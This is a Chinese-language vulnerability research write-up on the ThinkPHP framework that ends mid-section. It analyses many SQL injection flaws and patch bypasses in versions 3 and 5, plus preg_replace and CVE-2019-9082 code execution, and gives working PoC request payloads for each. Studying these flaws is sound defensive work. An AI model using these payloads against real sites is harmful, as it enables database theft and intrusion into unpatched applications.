# ThinkPHP

## 一、环境搭建

- composer 方式

ThinkPHP 3

```
composer create-project topthink/thinkphp=版本 文件名
```

ThinkPHP 5（完整版）

```
composer create-project topthink/think=版本 文件名
```

全局配置资源库源，比如官方默认使用packagist：

```
composer config -g repo.packagist composer https://packagist.phpcomposer.com
```

阿里云Composer全量镜像资源库：

```
composer config -g repo.packagist composer https://mirrors.aliyun.com/composer/
```

**REF：**[composer 安装与使用](https://www.runoob.com/w3cnote/composer-install-and-usage.html)、 [Packagist 镜像使用方法](https://pkg.xyz/)、[国内全量镜像大全](https://www.kancloud.cn/liqingbo27/composer/1245353)

- git方式

```
git clone --branch [tags标签] [git地址]
git clone -b [tags标签] [git地址]
```

tp5以上git源：

```
https://github.com/top-think/think.git
```

tp3以下git源：

```
https://github.com/top-think/thinkphp.git
```

tp3以下的版本不支持composer，2.2和2.1版在tp3的git库中

- 官方下载页面ftp上传至服务器

`https://www.thinkphp.cn/down/framework.html ` 一般更新的是稳定版

> 进行分析之前，需要好好了解框架信息，查看官方开发手册有助于上手理解整体的架构信息。
>
> 官方手册：看云集成tp3.2-6版本的开发手册
>
> [ThinkPHP3.2.3完全开发手册](https://www.kancloud.cn/manual/thinkphp/1678)
>
> [ThinkPHP5.0完全开发手册](https://www.kancloud.cn/manual/thinkphp5/118003)
>
> [ThinkPHP5.1安全开发手册](https://www.kancloud.cn/manual/thinkphp5_1/353946)
>
> [ThinkPHP6.0完全开发手册](https://www.kancloud.cn/manual/thinkphp6_0/1037479)

## 二、路由信息

框架分为完整版和核心版，主要区别在于完整版比核心版多了一些官方要求的库、扩展和驱动。tp5和tp6不属于tp3的新版本，每个大版本都是基于MVC架构设计的。每个大版本之间都不支持无缝升级。

不同系列的tp不同模式下配置不同：

- thinkphp3使用URL模式切换：普通GET模式、pathinfo、rewrite和兼容模式（针对不能使用pathinfo情况）

```php
# tp3.2.* /ThinkPHP/Conf/convention.php
return array(
  
  'URL_MODEL'              => 1, 
   //URL模式： 0 (普通模式)；1 (PATHINFO 模式) 默认；2 (REWRITE  模式)；3 (兼容模式) 
  
  // 静态路由：
	'URL_ROUTER_ON' = false, 
  'URL_ROUTE_RULES' = array(),
)
```

- thinkphp5直接配置URL访问模式：普通模式（pathinfo，包含了tp3兼容模式的内容）、**混合模式**（rewrite**默认**）、强制模式。

```PHP
# tp5.0.*全局配置路径：/application/config.php
# tp5.1.*：/config/app.php
return [
	# pathinfo
	'url_route_on' = false,
  # PATHINFO变量名 用于兼容模式
  'var_pathinfo' = 's'
]
 
return [
	# rewrite（默认）：路由规则+pathinfo
	'url_route_on' = true,
  'url_route_must' = false,
]
  
return [
	# 强制模式：自定义路由规则
  'url_route_must' = true,
]
```

- thinkphp6无需配置可基于pathinfo和兼容模式访问。只支持路由配置，自设动态路由和静态路由规则，通过Route类设定。开启强制路由的话，所有访问必须通过路由规则才能访问成功。配置路径为`/config/route.php`

## 三、主要漏洞

| 漏洞名称/编号                                       | 版本                                                         |
| --------------------------------------------------- | ------------------------------------------------------------ |
| 聚合查询功能count和max方法 Sql注入                  | tp[5.0.0, 5.0.23]/tp3全版本                                  |
| _parseOptions Sql注入                               | ThinkPHP <= 3.2.3                                            |
| parseWhereItem未过滤处理where查询表达式 Sql注入     | Thinkphp 3.*                                                 |
| parseWhereItem未过滤处理where查询表达式 Sql注入     | ThinkPHP 5.*                                                 |
| session Sql注入                                     | ThinkPHP (0, 3.2.3]                                          |
| parseOrder Sql注入                                  | tp5.\*/tp3.\*                                                |
| parseData Sql注入                                   | Tp5[5.0.13,5.0.15]/tp5[5.1.0,5.1.5]                          |
| parseArrayData Sql注入                              | ThinkPHP [5.1.6, 5.1.7]                                      |
| parseSql PDO参数 Sql注入                            | ThinkPHP (0, 3.1.3]                                          |
| preg_replace e模式 RCE                              | Tp2 [2.1, 2.2]/Tp3 [3.0, 3.1] Lite模式                       |
| Request::__construct变量覆盖+Request::input代码执行 | ThinkPHP [5.0.0, 5.0.23]                                     |
| 路由控制器未过滤+反射导致RCE                        | Tp5 [5.0.0, 5.0.23]/Tp5 [5.1.0, 5.1.30]                      |
| Cache::set 缓存设置代码注入                         | Tp3[3.2.3, 3.2.5]/Tp5[5.0.0,5.0.10]                          |
| think\process\pipes\Windows反序列化导致任意文件删除 | ThinkPHP 5.0.X                                               |
| think\process\pipes\Windows反序列化导致RCE          | ThinkPHP 5.1.X                                               |
| think\process\pipes\Windows反序列化导致文件写入     | ThinkPHP 5.2.X                                               |
| session反序列化导致任意写文件                       | ThinkPHP6.0.X                                                |
| think\Model\Pivot反序列化导致RCE                    | ThinkPHP 6.0.X                                               |
| View::assign() 变量覆盖+文件包含                    | ThinkPHP 3.2.*/Tp5.0.x [5.0.0, 5.0.18]/Tp5.0.x[5.1.0, 5.1.10] |
| LoadLangPack.php::switchLangSet() 多语言模式包含    | Tp5.0.x/Tp5.1.x/Tp6[6.0.1, 6.0.13]                           |

## （一）Sql注入

thinkphp处理sql语句流程：获取输入数据-CURD操作-内部处理数据-PDO参数处理-执行SQL语句。

### 1.聚合查询功能count和max方法未过滤调用parseKey

> CVE-2018-18530、CVE-2018-18529

#### - 利用条件

版本范围：ThinkPHP [5.0.0, 5.0.23]，ThinkPHP 3全版本

#### - 漏洞分析和原理

- thinkphp3

/ThinkPHP/Library/Think/Model.class.php::_call调用getField方法，外部数据由其函数中$field承接，并赋值给$options['field']，然后传入/ThinkPHP/Library/Think/Db/Driver.class.php::select方法。其调用buildSelectSql方法构建selectsql语句，构建完毕后带入query执行。

![img](https://cdn.nlark.com/yuque/0/2022/png/21861937/1647941715689-a48441f1-1a23-426a-b732-6d0e406bc4ac.png)

buildSelectSql方法调用了parseSql方法，parseSql方法通过parseField处理$options['field']。

![img](https://cdn.nlark.com/yuque/0/2022/png/21861937/1647941729868-df34cd3e-847f-4343-ae8d-c1812aee02ec.png)

parseField方法在数组类型的$field会直接拼接（parseKey直接return &key）。

![img](https://cdn.nlark.com/yuque/0/2022/png/21861937/1647941744444-030e5e60-1add-4d32-9e18-b35e3c538e61.png)

- thinkphp5

与thinkphp3流程类似，具体参考[【CVE-2018-18530】ThinkPHP5漏洞分析之SQL注入(六)](https://mochazz.github.io/2019/04/02/ThinkPHP5漏洞分析之SQL注入6/#漏洞概要)

#### - 漏洞复现

- demo构造

```php
//ThinkPHP 3
public function cntSql()
{
        $amount = I('get.amount');
        $num = M('user')->count($amount);
        dump($num);
}
//ThinkPHP 5
public function maxSql()
{
        $amount = request()->get('amount');
        $num = db('user')->max($amount);
        dump($num);
}

```

1. count方法用于统计数量，max方法用于获取最大值。需要先制定统计哪张数据表、查询条件等然后再进行调用。
2. 所有的各类聚合/统计查询方法内部调用的都是/thinkphp/library/think/db/Query.php的aggregate方法，该方法的第一个参数$aggregate用于指定上层调用该方法的聚合查询方法。

- PoC

1. ThinkPHP 3

```
http://x.x.x.x/index.php/Home/Index/cntSql?amount=id),updatexml(1,concat(1,user(),1),1)from+user%23
```

  2. ThinkPHP 5.0.0-5.0.21和5.1.1-5.1.10

```
http://x.x.x.x/public/index.php/index/index/index?amount=id),updatexml(1,concat(1,user(),1),1)from+user%23
```

  3. ThinkPHP 5.1.11-5.1.25

```
http://x.x.x.x/public/index/index/index/?amout=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23
```

- 数据库配置

自建数据库，建立表名为user的数据表，字段设置id、username、password三种。同时在默认应用配置下设置数据库配置信息Application\Common\Conf\config.php。后续其他sql注入复现需要的设置类似，不再做重复说明。

```php
   'DB_TYPE' => 'mysql',
   'DB_HOST' => '127.0.0.1',
   'DB_NAME' => '',//数据库名
   'DB_USER' => 'root',
   'DB_PWD' => 'root',
   'DB_PORT' => '3306',
   'DB_FIELDS_CACHE' => true,
   'SHOW_PAGE_TRACE' => true
```

### 2.ThinkPHP/Library/Think/Model.class.php::_parseOptions未过滤$option导致Sql注入

> wooyun-2014-088251

#### - 利用条件

版本范围：ThinkPHP <= 3.2.3

#### - 漏洞原理和分析

$option查询条件可以不经过数据处理直接传入_parseOption，再带入`Driver.class.php`的sql操作函数，如select、delete、find的方法。主要通过`buildSelectSql`方法或直接调用`delete`等方法进行拼接sql语句中，然后带入`execute`执行。

#### - 漏洞复现

- demo构造

```php
public function optionSql()
{
        $id = I('id');
        //$res = M('user')->find($id);
        //$res = M('user')->delete($id);
        $res = M('user')->select($id);
        //连接数据库后实例化user模型类，对应数据库的user表
}

```

说明：delete操作比select和find操作受限

- PoC

  举例三个不太好构造的，其他的是什么where语句的条件，对应的函数就是什么parseXXX。

  - comment -- parseComment

  `id[comment]=\*/where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)/\*`

  - limit

  `id[limit]=1,1+procdure+analyse(updatexml(1,concat(0x7e,user(),0x7e),1),1)--`

  - fields：传入的where查询条件不能为数组否则会被_parseOption if判断过滤

  `id[fields]=* from user where 1 and updatexml(1,concat(0x7e,user(),0x7e),1) --+`

### 3. ThinkPHP\Library\Think\Db\Driver.class.php::parseWhereItem未过滤处理where查询表达式

> WooYun-2014-87731(BETWEEN表达式)、WooYun-2014-86737、wooyun-2014- 086968(EXP表达式）、WooYun-2014-86742(EQ/NEQ/GT表达式)	

#### - 利用条件

版本范围：

bind表达式：ThinkPHP <= 3.2.4

between表达式：ThinkPHP 3.1.*-3.2.0

eq/neq/gt表达式：ThinkPHP 3.2.*

#### - 漏洞原理和分析

针对PDO参数为查询表达式时候用parseWhereItem方法分析过程中产生的SQL注入：

1. ThinkPHP/Library/Think/Model.class.php::save方法调用ThinkPHP\Library\Think\Db\Driver.class.php::update方法，用于传入查询表达式$options执行SQL语句。
2. 进一步调用ThinkPHP\Library\Think\Db\Driver.class.php::parseWhere分析$option，默认使用ThinkPHP\Library\Think\Db\Driver.class.php::parseWhereItem处理where查询表达式
3. 不同表达式，parseWhereItem拼接位置不同，但都是直接拼接$key。

注：bind方式没有在手册中写出，查看源码注释得到的解释，parseWhereItem注解：

![img](https://cdn.nlark.com/yuque/0/2022/png/21861937/1648710850925-4bd7eabe-3c7c-4fab-ac24-5b55a96c010e.png)

#### -漏洞复现

- demo构造

  where处理sql语句PDO参数的时候会使用表达式，查询表达式不仅可以用关键词还可以用符号。使用方法：[查询表达式](https://www.kancloud.cn/manual/thinkphp/1768)。

  - exp和bind表达式

  ```php
  public function updateSql()
  {
    $user = M('user');
    $u['id'] = I('id');
    $data['tel'] = I('tel');
    $data['email']= I('email');
    $res = $user->where($u)->save($data);
      //update方法 
      //$res = $user->where($u)->insert($data) 
      //insert方法 var_dump($res);
  }
  ```

  - eq/neq/gt表达式

  ```php
  public function eqneqgtSql()
  {
          $username = I('post.username', '', 'trim');
          $pwd = I('post.pwd', '', 'trim');
          $res = M('user')->where(array(
              'username' => $username,
              'password' => $pwd,
          ))->find();
          dump($res);
  }
  ```

  - between表达式

  ```php
  public function betweenSql()
  {
       $username = I('get.uname');
       $u = M('user')->where(array(
        'username' => $username
       ))->find();
       dump($u);
  }
  ```

- PoC

exp和bind表达式：

`id[]=bind&id[]=1%27&tel[]=112312616&email=admin@emal.com`

> exp表达式tp3.2.3就被think_filter给过滤了，tp3.2.2和3.1.3中使用的是filter_exp过滤，存在漏洞的版本过于古早。

eq|neq|gt表达式：

`username=admin&pwd[0]=neq&pwd[1]=111'`

between表达式：

`username[0]=aa%27between&username[1]=a`

### 4. thinkphp/library/think/db/Builder.php::parseWhereItem未过滤处理where查询表达式

#### - 利用条件

版本范围：

EXP: ThinkPHP 5.* 全版本

LIKE/NOT LIKE:ThinkPHP 5.0.10 

IN:ThinkPHP < v5.0.10

#### - 漏洞原理和分析

1. `/thinkphp/library/think/db/Query.php::where`调用parseWhereExp分析where各类查询条件。

2. 从ThinkPHP 5.1.6开始发现parseWhereExp方法直接调用其他方法，如`whereXXX`或`parseWhereItem`分析处理查询条件，而不是只是通过bind方法绑定参数或直接拼接的方式处理（5.0.*和5.1.0-5.1.5之间解析查询条件的过程也明显有变化）。

3. EXP表达式在5.1.8版本及其以上都会经过`whereExp`方法处理，IN和NOT LIKE/LIKE通过`parseArrayWhereItem`或者直接`checkMultiField`判断为数组后逐步解析查询条件。

4. Query.php的select->Connection.php的select->Builder.php的select(类似tp3的parseSql) ->parseWhere-> buildWhere：

   对比tp3，tp5的parseXXX方法通过buildWhere集中处理$where查询条件并完成拼接->Builder.php的parseWhereItem->按照表达式以动态函数方式调用parseXXX方法（XXX对应表达式） 

   *注:NOT LIKE/LIKE、IN表达式没有最有一步*

**与上一个tp3的sql注入比较：**

1. tp5提供固定了表达式的各类表达式方法，形如`whereXXX()`。每个`whereXXX`基本上都是调用`parseWhereExp`且$op（查询表达式）固定为XXX。

2. NOT LIKE/LIKE表达式

   filterExp方法通过preg_replace正则过滤关键词，不包含"NOT LIKE"(正则匹配前会大小写转换后再匹配)。Builder.php的$exp初始化设定中，5.0.10比其他版本多设定了"not like"作为预设数据库的表达式。

   ```php
   protected $exp = ['eq' => '=', 'neq' => '<>', 'gt' => '>', 'egt' => '>=', 'lt' => '<', 'elt' => '<=', 'notlike' => 'NOT LIKE', 'not like' => 'NOT LIKE', 'like' => 'LIKE', 'in' => 'IN', 'exp' => 'EXP', 'notin' => 'NOT IN', 'not in' => 'NOT IN', 'between' => 'BETWEEN', 'not between' => 'NOT BETWEEN', 'notbetween' => 'NOT BETWEEN', 'exists' => 'EXISTS', 'notexists' => 'NOT EXISTS', 'not exists' => 'NOT EXISTS', 'null' => 'NULL', 'notnull' => 'NOT NULL', 'not null' => 'NOT NULL', '> time' => '> TIME', '< time' => '< TIME', '>= time' => '>= TIME', '<= time' => '<= TIME', 'between time' => 'BETWEEN TIME', 'not between time' => 'NOT BETWEEN TIME', 'notbetween time' => 'NOT BETWEEN TIME'];
   ```

   （2）针对5.0.10以下的版本：

   5.0.10以下的版本没有该表达式。parseWhereItem在检测表达式是否有效的时候，即`if(isset($this->exp[$exp]))`，会进行匹配。若能匹配上预设表达式，$exp能够成功赋值并顺利进行后续的赋值。因此，5.0.10以下的版本不会受此漏洞影响。

   （3）针对5.1.*版本：

   5.1.\*的版本没有统一设定过滤的filterExp，不会过滤exp。表达式预设的情况为NOTLIKE，会自动转换为NOT LIKE。 但是5.1.*版本中查询表达式时where方法调用的parseWhereExp有对$field(承接输入的 $username)进行parseArrayWhereItems处理。

   ![img](https://cdn.nlark.com/yuque/0/2022/png/21861937/1648698782590-435d2792-8134-434b-9756-40326d22cdfc.png)

   parseArrayWhereItems方法会添加上IN表达式，因此后续$exp会变成IN，输入的$username则不会完全变成输入数据。

   ![img](https://cdn.nlark.com/yuque/0/2022/png/21861937/1648698800946-fe27dede-586a-42f8-8ea5-0647ac7cc515.png)

3. TP5查询表达式中没有BIND分支，因此对比TP3没有BIND表达式SQL注入。

#### - 漏洞复现

- demo构造

```php
public function index()
{
  $username = request()->get('username');
  //EXP表达式，方法名为whereSql
  $result1 = db('users')->where('username','exp',$username)->select(); 
  //NOT LIKE/LIKE和IN表达式
  $result2 = db('users')->where(['username'=>$username])->select(); 
  //IN表达式 第二种
  $result3 = db('users')->where('id', 'in', $ids)->select();
  dump($result);
}
```

- PoC

exp表达式：

`username=)%20union%20select%20updatexml(1,concat(1,user(),1),1)%23`

NOT LIKE/LIKE表达式：

`username[0]=not+like&username\[1\]\[0\]=%%&username\[1\]\[1\]=233&username\[2\]=)%20union%20select%20updatexml(1,concat(1,user(),1),1)%23`

IN表达式：

`username[0,updatexml(1,concat(1,user(),1),1)]=1231`

### 5.ThinkPHP/Library/Think/Session/Driver/Db.class.php::write未过滤session导致Sql注入

#### - 利用条件

版本范围：ThinkPHP (0, 3.2.3]

#### - 漏洞原理和分析

tp框架的session如果是写入数据库中，有调用封装好的session驱动完成，驱动为`ThinkPHP/Library/Think/Session/Driver`，该漏洞涉及到设置session的时候对session值没有过滤，可通过闭环sql语句造成任意登录或直接造成sql注入。流程如下：

ThinkPHP内核处理session的handler没有对sessionData过滤：ThinkPHP/Library/Think/Session/Driver/Db.class.php::session()-->ThinkPHP/Library/Think/Session/Driver/Db.class.php::write()

详细见[ThinkPHP一处过滤不当造成SQL注入漏洞](https://bugs.leavesongs.com/php/thinkphp一处过滤不当造成sql注入漏洞/)

#### -漏洞复现

- demo构造

  ```php
  public function login(){
          session("admin", I('post.username'));
      //username作为session值
          $this->show('登录成功','utf-8');
      }
  ```

- PoC

  闭合

  `username=a'|sleep(3))%23` 

### 6.thinkphp/library/think/db/Builder.php::parseOrder未过滤调用parseKey

> CVE-2018-18546(TP3)、CVE-2018-16385（TP5）、**CVE-2021-44350(TP5绕过)**

#### - 利用条件

1. 版本范围：ThinkPHP <= 3.2.3,  5.1.16<=ThinkPHP <5.1.23（CVE-2018-16385），5.0.0<=ThinkPHP<=5.0.16 + 5.1.0<=ThinkPHP<=5.1.8（CVE-2021-44350）
2. php版本限制：php7.4以下（不包含）

[从7.4以后，只能使用第一种形式$value\[0\]获取字符串偏移了，第二种方法$value{0}被弃用。](http://www.zhishibo.com/articles/203530.html)

#### - 漏洞原理和分析

parseOrder的order查询语句数组类型下没有对$key/$field过滤就直接拼接sql

每次绕过的方式可以查看patch章节

#### -漏洞复现

- demo构造

  - CVE-2018-18546(ThinkPHP3)

  ```php
  public function orderbySql()
  {
    $user = M('user');
    $data = array();
    $data['username'] = array('eq', 'admin');
    $order=I('get.order');
    $m = $user->where($data)->order($order)->find();
  } 
  ```

  - CVE-2018-16385和CVE-2021-44350(ThinkPHP5)

  ```php
  public function orderSql()
  {
    $order = input('get.order');
    $where = [              
      'username' => 'admin'
    ];
    $res = db('user')->where($where)->order($order)->find();
    dump($res);
  }
  ```

- PoC

  - CVE-2018-18546(ThinkPHP3)

  `order[updatexml(1,concat(0x3a,user()),1)]=`

  - CVE-2018-16385(ThinkPHP5)

  `order[id`|updatexml(1,concat(0x3a,version()),1)#]=1`

  - CVE-2021-44350(上一个绕过)

     ^、-、%、/、&、+符号都可以，这里举例第一个^：

  `order[id^updatexml(1,concat(0x3a,version()),1)]=1`

### - Patch

- [Thinkphp 3 patch 1](https://github.com/top-think/thinkphp/commit/3f97fa89843e98780abf14f08b731856417cf88e)：

重写的parseKey方法设置$strict判断是否要安全过滤的标志位。调用该方法开启标志位则进行安全过滤：

![img](https://cdn.nlark.com/yuque/0/2022/png/21861937/1650336021601-e9c4981e-0361-46a8-a967-926ac5128681.png)

开启标志位下，存在单双引号、括号、反引号、星号的$key全部要被反引号包裹后再返回给上层。

在TP5框架中也是使用的该方式防御注入，可通过闭合反引号绕过该补丁。

- ThinkPHP 3 patch2:

   查看`tp-3.2.5/ThinkPHP/Library/Think/Db/Driver/Mysql.class.php::parseKey()`修复方案：

```php
if ($strict && !preg_match('/^[\w\.\*]+$/', $key)) {
            E('not support data:' . $key);
        }
if ('*' != $key && !preg_match('/[,\'\"\*\(\)`.\s]/', $key)) {
            $key = '`' . $key . '`';
}
```

- ThinkPHP 5 不同版本的patch稍有差别：

`[tp5-5.0.16]tp-5.0.15/thinkphp/library/think/db/builder/Mysql.php::parseKey()`

```php
if (!preg_match('/[,\'\"\*\(\)`.\s]/', $key)) {
            $key = '`' . $key . '`';
}
//[CVE-2021-44350]tp5.1-tp5.1.8也是同样的代码
```

`[tp-5.0.18-5.0.19]tp-5.0.18/thinkphp/library/think/db/builder/Mysql.php::parseKey()`

```php
if ('*' != $key && ($strict || !preg_match('/[,\'\"\*\(\)`.\s]/', $key))) {
            $key = '`' . $key . '`';
}
//[CVE-2018-16385]tp5.1.16-5.1.23同样的代码，同tp3 patch1，可闭合`绕过
```

`[5.0.22-5.0.24]tp-5.0.22/thinkphp/library/think/db/builder/Mysql.php::parseKey()`

```php
//parseKey有效修复方案,但tp-5.0.20没有这段代码导致CVE-2021-44350
if ($strict && !preg_match('/^[\w\.\*]+$/', $key)) {
            throw new Exception('not support data:' . $key);
        }
//[CVE-2018-16385]若只有该段同tp3 patch1，可闭合`绕过
if ('*' != $key && ($strict || !preg_match('/[,\'\"\*\(\)`.\s]/', $key))) {
            $key = '`' . $key . '`';
        }
```

`[tp5.1.10-5.1.15+tp5.1.24-5.1.41]parseKey()`

```php
//parseKey有效修复方案1
if ($strict && !preg_match('/^[\w\.\*]+$/', $key)) {
            throw new Exception('not support data:' . $key);
        }
if ('*' != $key && !preg_match('/[,\'\"\*\(\)`.\s]/', $key)) {
            $key = '`' . $key . '`';
//[CVE-2018-16385]若只有该段同tp3 patch1，可闭合`绕过
```

此外出了对parseKey做了设置，同时在调用parseKey的时候也做了正则匹配（主要是\w+）或者过滤了#（过滤#能修复CVE-2021-44350）:

https://github.com/top-think/framework/commit/673e505421b25bdee2f02b668e5fd1ac79a3d190

https://github.com/top-think/thinkphp/commit/9748cb80d2f24c89218f358ca2f5ab88ee33396f

### 7.thinkphp/library/think/db/Builder.php::parseData方法未过滤调用parseKey

#### - 利用条件

版本范围：5.0.13<=ThinkPHP<=5.0.15（inc/dec），5.1.0<=ThinkPHP<=5.1.5（exp/inc/dec）

#### - 漏洞原理和分析

1. /thinkphp/library/think/db/Query.php的insert和update最终调用/thinkphp/library/think/db/Builder.php的parseData方法对$data数据进行处理
2. 对数组类型的$data($val)，$val[0]为inc或dec分支下会调用parseKey方法直接返回$val[1]并拼接到sql语句中；exp分支则直接赋值
3. parseKey内部针对$key处理情况参考第9个漏洞thinkphp5 patch部分的修复方案分析，属于没有反引号等符号会用反引号包裹的情况。

注意点：

1. tp5.1.\*没有对exp关键词过滤，inc和dec调用了parseKey未过滤拼接，但exp分支直接将$val[1]赋值给$result[$item]（用于拼接sql语句）；tp5.0.*有做过滤因此不存在该分支下的漏洞。
2. tp5.1.\*没有采用tp5.0.*的修复方式，因为会漏处理exp分支。

#### -漏洞复现

- demo构造

```php
public function insertDataSql() {
  $username = request()->get('username/a');
  db('users')->insert(['username' => $username]); return 'Update success';
}
```

- PoC

   exp、inc、dec都可以，这里举例第一个：

`username[0]=exp&username[1]=updatexml(1,concat(1,user(),1),1)&username[2]=2`

### 8. thinkphp/library/think/db/builder/Mysql.php::parseArrayData未过滤处理$data

#### - 利用条件

版本范围：ThinkPHP [5.1.6, 5.1.7]，未打补丁的5.1.8也受影响

#### - 漏洞原理和分析

1. `/thinkphp/library/think/db/Query.php::update`通过setOption设置外部数据`$data`，进一步调用`/thinkphp/library/think/db/Builder.php::update`方法

2. Builder.php的update方法通过`/thinkphp/library/think/db/Builder.php::parseData`处理`$data`,

3. 若$data为数组，`parseData`默认调用`/thinkphp/library/think/db/Builder.php`的`parseArrayData`

4. parseArrayData方法point分支未过滤直接拼接参数：

   ```php
   protected function parseArrayData(Query $query, $data)
       {
           list($type, $value) = $data;
   
           switch (strtolower($type)) {
               case 'point':
                   $fun   = isset($data[2]) ? $data[2] : 'GeomFromText';
                   $point = isset($data[3]) ? $data[3] : 'POINT';
                   if (is_array($value)) { 
                       $value = implode(' ', $value);
                   }
                   $result = $fun . '(\'' . $point . '(' . $value . ')\')';# vulnpoint
                   break;
               default:
                   $result = false;
           }
   
           return $result;
       }
   ```

#### -漏洞复现

- demo构造

```php
public function parseArrDataSql()
    {
        $username = request()->get('username/a');
        db('users')->where(['id' => 1])->update(['username' => $username]);
        return 'Update success';
    }
```

- PoC

`username[0]=point&username[1]=1&username[2]=updatexml(1,concat(1,user(),1),1)^&username[3]=0`

### 9.ThinkPHP/Lib/Core/Model.class.php::parseSql未过滤处理PDO数组参数

#### - 利用条件

版本范围：ThinkPHP (0, 3.1.3]

#### - 漏洞原理和分析

ThinkPHP/Lib/Core/Model.class.php的parseSql方法会对$parse通过vsprintf直接格式填充处理，没有进行安全过滤。

![img](https://cdn.nlark.com/yuque/0/2022/png/21861937/1648546399377-78f6044a-f9a3-4b68-927d-183c4831e1e0.png)

#### -漏洞复现

- demo构造

```php
public function sSql(){
        $User = M('user');
        $this->user = $User->select();
        $this->display();

        $user2 = M('user');
        $res = $user2->query('select * from user  where id = "%s"', array($_GET['id']));
        dump($res);
    }
```

### 10.其他Sql注入

官方回复忽略或者违背官方手册标准使用方法导致的漏洞

#### CVE-2018-17566

这个漏洞属于where方法查询的时候查询参数没有手动绑定参数属于使用方式错误，官方手册明确表示不可以直接通过拼接传入参数值。和框架本身没有很大的关联，属于开发自己使用错误才会导致的漏洞，这里不做分析。

#### WooYun-2015-115580

官方忽略了漏洞，主要反馈是I函数filter_exp和think_filter均有过滤exp关键词，只要按照官方手册指定方式获取数据则不会导致该漏洞，除非直接使用$\_POST/$\_GET等。

### 11.整体分析

根据上述几个漏洞分析，整理了一个thinkphp3-5之间sql注入的挖掘思路：

<img width="2560" alt="TP3和TP5注入分析" src="https://user-images.githubusercontent.com/22220751/226242661-4d41cf32-d80d-4ef0-b842-80564580867d.png">


通过这个xmind图可以发现sql注入挖掘可以从数据库交互操作的各个阶段进行：输入数据接口部分、数据执行操作之前是否进行安全过滤部分、框架自身对不同情况下数据处理部分（增删改查、查询条件和表达式条件处理）

第三个部分的阶段发觉sql注入最难，总体思路就是去分析传入参数的时候该分支或该参数只要是没有过滤完全或者没过滤直接拼接的情况就能导致sql注入发生。

<img width="1867" alt="【TP3和TP5】查询表达式SQL注入" src="https://user-images.githubusercontent.com/22220751/226242674-1e20809d-c0f6-4f2f-9032-b131abec60a5.png">


通过这个思路，特别是表达式处理的部分，在框架本身存在的sql注入之外，去挖掘上层基于框架Web应用的sql注入，一个简单的思路是使用方法不当造成sql注入。比如，数据应该通过参数绑定的形式进行传入，但是没有过滤就直接拼接执行了；thinkphp框架本身开启了预编译，参数也进行绑定了，然而唯独没有对数组类型的参数key没进行任何过滤，那么也会导致sql注入。

## （二）RCE漏洞

### 1.preg_replace e模式

#### - 利用条件

1. 版本范围：ThinkPHP [2.1, 2.2]，ThinkPHP [3.0, 3.1] Lite模式

ThinkPHP 3.2.*版本已经不使用preg_replace处理路由

2. 对PHP版本有限制，PHP7开始遗弃preg_replace e模式代码执行。此处指的是网站搭建所使用PHP版本，而不是系统命令行的PHP版本。

#### - 漏洞原理和分析

1. Dispatcher.class.php的dispatch方法在self::routeCheck分支下调用了preg_replace的e模式，且该模式下外部传参的$path可控，导致代码执行。
2. tp3系列中如果设置了分组`GROUP_NAME`，该分支会包含`tags.php`，其中调用的`CheckRouteBehavior`行为 `*parseRule`和`*parseRegex`方法同样使用了preg_replace函数e模式。\

详细分析参考如下：

[Thinkphp框架任意代码执行漏洞利用及修复](https://blog.csdn.net/zqsqrlqd/article/details/68923320)
[ThinkPHP系列漏洞之ThinkPHP 2.x 任意代码执行](https://www.freebuf.com/sectool/223149.html)

#### -漏洞复现

```HTTP
GET /thinkphp/tp-2.1/?s=Index/index/xxx/${print(THINK_VERSION)} HTTP/1.1
Host: x.x.x.x
```

### 2.【CVE-2019-9082】Request::__construct变量覆盖+Request::input代码执行

#### - 利用条件

1. 版本范围：ThinkPHP [5.0.0, 5.0.23]
2. 该漏洞分三种情况：

- trace+强制路由（url_route_on和url_route_must开启）
- debug+url_route_on路由开启（默认）
- $dispatch['method']+url_route_on路由开启（默认）

#### - 漏洞原理和分析

##### （1）框架路由模式和设置

官方手册在“路由模式”一章说明了，tp5主要有普通模式、混合模式和强制模式三种，了解路由模式有助于该漏洞的原理分析。

https://www.kancloud.cn/manual/thinkphp5/118019

##### （2）原理简述

该漏洞是属于thinkphp在不同路由模式下可通过`Request::__construct`变量覆盖漏洞传入需要代码执行的参数或参数值，结合`Request::input`一处存在的`call_user_func`方法进行触发导致代码执行漏洞。代码执行两个关注点，一个是参数可控，一个是漏洞触发。传入可控参数主要在于路由上，不同路由下均有可控参数传入的方式。触发代码执行的这部分，可通过查找调用Request::input的各处不同上层方法即可完成整个代码执行的漏洞分析。

> 代码展示版本tp5.0.23

- Request::__construct变量覆盖漏洞

Request::__construct构造函数通过循环可以进行变量覆盖，$options在tp中一般会存储外部参数。

![img](https://cdn.nlark.com/yuque/0/2022/png/21861937/1650786894174-7be517fc-19f7-466a-8797-4817342dd96d.png)

Request::param调用了Request::method方法通过动态函数方式可调用任意可执行函数，可以指定Request::__construct处理传参。

![img](https://cdn.nlark.com/yuque/0/2022/png/21861937/1650787006882-96e8e035-94c8-40eb-8ee5-12b74fcae5db.png)

- Request::input代码执行漏洞`call_user_func`

Request::filterValue调用call_user_func，该方法由Request::input调用，用于过滤外部数据。利用设置的$filter函数过滤外部穿参，$value对应需要被过滤的数据。

![img](https://cdn.nlark.com/yuque/0/2022/png/21861937/1650800290237-6e19d997-4a3b-4289-ad42-0a0398c7b681.png)

- thinkphp检查路由模式的程序思路

  tp5默认为混合路由（rewrite模式），即url_route_on默认为on，url_route_must默认为off。检测路由使用的是App::routeCheck()，因此默认正常情况下检测强制路由的$must为false，$result为true（或等同于true）。

  ![img](https://cdn.nlark.com/yuque/0/2022/png/21861937/1650857001574-d27f702c-11c8-4caa-a717-ca2bf387d914.png)

  不同的路由方式可能在不同的地方可触发函数调用的上层函数，如Request::param/Request::isAjax/Request:exec等有在内部方法最后`return $this->input($this->param, ....)`

  - **方式一：强制路由开启trace**

  ![img](https://cdn.nlark.com/yuque/0/2022/png/21861937/1650800856166-c86d227e-4a3d-46fd-8d45-6f84d9b356fa.png)

  App::run开始的是传参链条，目的将外部数据覆盖掉内部各个Request属性；Responese::send链目的调用filterValue方法触发call_user_func。

  $must是判断是否开启强制路由，只有当url_route_on和url_route_must同时开启才会true。

  这里的Response::send触发是因为强制路由开启，但是路由传入错误导致报错的，不是返回了start.php页面app类触发。同时该代码逻辑里面判断trace模式开启的话就会输出刚才错误的每一步信息，通过调用Request::isAjax完成，该方法最终调用了Request::input因此能够触发代码执行漏洞。至于能控制的参数，trace模式里意图输出的参数内容是server参数，因此在这个参数里传入我们的命令。

  - **方式二：混合路由开启debug**

